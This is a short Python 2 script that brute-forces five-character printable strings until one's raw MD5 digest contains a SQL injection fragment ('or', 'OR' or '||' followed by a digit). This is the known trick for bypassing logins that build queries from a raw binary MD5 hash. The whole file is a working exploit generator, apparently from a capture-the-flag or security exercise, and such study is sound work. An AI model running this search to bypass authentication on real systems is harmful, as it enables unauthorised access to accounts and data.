import hashlib
import array


arr = []
for i in range(5):
    arr.append(32)

#j = len(array) -1
increment = 0
lowest = len(arr) -1
while (arr[0]<127):
    arr[lowest] += 1
    increment += 1
    j = lowest
    while(arr[j] > 126 and j > 0):
        arr[j] = 32
        j -= 1
        arr[j] += 1
    pw = array.array('B', arr).tostring()
    #print "entering checking: "+pw
    m = hashlib.md5(pw).digest()
    #print "hash result:", m
    #print "length: ", len(m)

    position0 = m.find("'")
    if(position0 != -1):
        #print "find a similar one" + m
        position1 = m.find("'||'")
        if((position1 != -1) and (position1 < 12) and (m[position1+4] >'0') and (m[position1+4]<':')):
            print"entering the check"
            print m
            print arr
            break
        position2 = m.find("'or'")
        if ((position2 != -1) and (position2 < 12) and (m[position2+4] >'0') and (m[position2+4]<':')):
            print m
            print arr
            break
        position3 = m.find("'OR'")
        if((position3 != -1) and (position3 < 12) and (m[position3+4] >'0') and (m[position3+4]<':')):
            print m
            print arr
            break
    # if(check(pw)):
    #     print arr
    #     break

    if(arr[0] > 126):
        print "search all, nothing found"
        break
    if(increment % 1000000 == 0):
        print "already count: ", increment
        print "current string checking:"+pw